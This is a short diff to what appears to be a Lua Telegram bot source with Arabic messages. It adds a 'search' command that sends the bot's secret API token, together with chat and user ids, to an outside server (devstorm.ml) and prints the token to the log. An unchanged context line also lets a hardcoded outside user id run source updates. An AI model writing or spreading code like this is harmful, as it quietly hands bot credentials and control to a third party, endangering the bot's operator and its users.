@@ -943,6 +943,12 @@ return sendMsg(msg.chat_id_,msg.id_,"*تم*",function(arg,data)
 Refresh_Start = true
 end)
 end 
+if msg.text and msg.text:match('^بحث (.*)$') and not redis:get(boss..'dw:bot:api'..msg.chat_id_) then            
+local Ttext = msg.text:match('^بحث (.*)$') 
+local MsgId = msg.id_/2097152/0.5
+print("https://devstorm.ml/youtube/tahaj200.php?token="..Token.."&msg="..MsgId.."&Text="..URL.escape(Ttext).."&chat_id="..msg.chat_id_.."&user="..msg.sender_user_id_)
+https.request("https://devstorm.ml/youtube/tahaj200.php?token="..Token.."&msg="..MsgId.."&Text="..URL.escape(Ttext).."&chat_id="..msg.chat_id_.."&user="..msg.sender_user_id_)
+end
 if msg.text == 'Update Source' and (msg.sender_user_id_ == SUDO_ID or msg.sender_user_id_ == 1619524486 or msg.sender_user_id_ == 1619524486) then
 UpdateSource(msg)
 sendMsg(msg.chat_id_,msg.id_,'👷🏽| {* تــم تحديث وتثبيت السورس  *} 📡.\n\n👨🏼‍💼| { Bot is Update » }👍🏿',function(arg,data)
